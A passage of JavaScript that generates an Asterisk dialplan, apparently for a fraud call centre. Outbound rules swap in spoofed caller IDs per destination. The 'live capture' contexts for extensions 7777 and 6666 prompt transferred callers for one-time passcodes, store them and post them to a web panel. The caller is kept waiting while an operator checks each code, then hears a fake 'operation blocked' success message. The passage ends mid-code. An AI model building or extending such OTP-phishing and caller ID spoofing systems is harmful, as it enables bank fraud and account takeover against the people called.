  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += `; 4. Regla Saliente USA / Canada 10 digitos (ej. 6104803845 -> prepends 1)\n`;
  dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(__CALL_DEST=1\${EXTEN})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/1\${EXTEN})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=1\${EXTEN})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
  dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += `; 5. Regla Saliente Universal (Cualquier longitud)\n`;
  dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${EXTEN}_cid_num)})\n`;
  dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${EXTEN}_cid_name)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += `exten => h,1,NoOp(=== [FROM-INTERNAL HANGUP] Canal colgado: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  dialplanContent += `[from-trunk]\n`;
  dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
  dialplanContent += ` same => n,Set(DEFAULT_ACTION=\${IF($["\${DB(ivr_vars/default_action)}" != ""]?\${DB(ivr_vars/default_action)}:ivr-press1)})\n`;
  dialplanContent += ` same => n,Goto(\${DEFAULT_ACTION},s,1)\n\n`;

  dialplanContent += `; ========================================================\n`;
  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
  dialplanContent += `; Espera validación del asesor antes de retornar la llamada\n`;
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `[ivr-otp-live-7777]\n`;
  dialplanContent += `exten => s,1,Goto(ivr-captura-vivo,s,1)\n\n`;
  dialplanContent += `[ivr-captura-vivo]\n`;
  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;

  dialplanContent += ` ; Determinar audios para la extension 7777\n`;
  dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/default_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;

  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/8888_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;

  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/8888_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;

  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/8888_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;

  dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;

  dialplanContent += ` ; Bucle de solicitud del codigo OTP\n`;
  dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Solicitando Codigo OTP (Intento \${RETRY_COUNT}) con audio: \${AUDIO_7777} ===)\n`;
  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},10,,2,15)\n`;
  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,Read(USER_DIGITS,beep,10,,2,8)\n`;
  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;

  dialplanContent += ` ; Si tras 2 intentos no marca nada, devolver la llamada al agente en lugar de colgar\n`;
  dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo)\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Sin digitos tras reintentos -> Regresando llamada al agente \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += ` ; Digitos capturados (minimo 4 digitos)\n`;
  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} -> NOTIFICANDO AL ASESOR ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/7777)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/7777)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/8888)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/8888)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&callerid=\${CALLERID(num)}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;

  dialplanContent += ` ; PASO DE ESPERA: Locucion 'Un momento por favor, estamos validando...'\n`;
  dialplanContent += ` same => n(espera_validacion),NoOp(=== [CAPTURA-7777] Reproduciendo audio de espera: \${AUDIO_WAIT} ===)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_WAIT})\n`;
  dialplanContent += ` same => n,Wait(1)\n`;

  dialplanContent += ` ; BUCLE INTELIGENTE: Esperando decision del asesor en la interfaz web (Valido o Invalido)\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
  dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
  dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, CID: \${CALLERID(num)}, Code: \${USER_DIGITS}) ===)\n`;

  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
  dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
  dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?codigo_aprobado)\n`;

  dialplanContent += ` ; Tono suave cada 5 segundos para mantener canal abierto\n`;
  dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;

  dialplanContent += ` ; RAMA APROBADO: Asesor marco VALIDO en la web -> Locucion de exito y reconecta con el asesor\n`;
  dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-7777] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
  dialplanContent += ` same => n,Wait(0.5)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;

  dialplanContent += ` ; RAMA RECHAZADO: Asesor marco INVALIDO en la web -> Locucion de error y vuelve a pedir el codigo\n`;
  dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-7777] TOKEN INVALIDO DETECTADO -> REINTENTANDO ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
  dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;

  dialplanContent += `exten => h,1,NoOp(=== [CAPTURA-7777 HANGUP] Cliente colgo canal: \${CHANNEL} | Causa: \${HANGUPCAUSE} ===)\n`;
  dialplanContent += ` same => n,Set(TARGET_NUM=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,Set(DB(call_status/\${TARGET_NUM})=ended)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/call/status/update?number=\${TARGET_NUM}&status=ended&cause=\${HANGUPCAUSE}&channel=\${CHANNEL}" &)\n\n`;

  dialplanContent += `; ========================================================\n`;
  dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 6666\n`;
  dialplanContent += `; Mismas funciones que la 7777 pero con soporte de audios propios (6666_intro, etc.)\n`;
  dialplanContent += `; ========================================================\n`;
  dialplanContent += `[ivr-otp-live-6666]\n`;
  dialplanContent += `exten => s,1,Goto(ivr-captura-vivo-6666,s,1)\n\n`;
  dialplanContent += `[ivr-captura-vivo-6666]\n`;
  dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-6666] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
  dialplanContent += ` same => n,Answer()\n`;
  dialplanContent += ` same => n,Wait(1.5)\n`;
  dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/6666)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/7777)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/8888)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-6666] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Set(AUDIO_6666=\${DB(ivr_vars/6666_prompt)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/6666_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/welcome_6666)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/7777_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/7777_intro)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=\${DB(ivr_vars/\${TARGET_DEST}_prompt)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_6666}" = ""]?Set(AUDIO_6666=custom/solicitar_codigo_otp))\n`;
  dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/6666_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/7777_wait)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
  dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/6666_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/7777_success)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
  dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/6666_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/7777_failure)}))\n`;
  dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
  dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
  dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-6666] Solicitando Codigo OTP (Intento \${RETRY_COUNT}) con audio: \${AUDIO_6666} ===)\n`;
  dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
  dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_6666},10,,2,15)\n`;
  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,Read(USER_DIGITS,beep,10,,2,8)\n`;
  dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
  dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo)\n`;
  dialplanContent += ` same => n,NoOp(=== [CAPTURA-6666] Sin digitos tras reintentos -> Regresando llamada al agente \${FINAL_AGENT} ===)\n`;
  dialplanContent += ` same => n,Playback(beep)\n`;
  dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
  dialplanContent += ` same => n,Hangup()\n\n`;
  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-6666] CODIGO DIGITADO: \${USER_DIGITS} -> NOTIFICANDO AL ASESOR ===)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/6666)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/6666)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/6666)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/7777)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/7777)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_codes/8888)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_captures/8888)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
  dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&callerid=\${CALLERID(num)}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
  dialplanContent += ` same => n(espera_validacion),NoOp(=== [CAPTURA-6666] Reproduciendo audio de espera: \${AUDIO_WAIT} ===)\n`;
  dialplanContent += ` same => n,Playback(\${AUDIO_WAIT})\n`;
  dialplanContent += ` same => n,Wait(1)\n`;
  dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
  dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
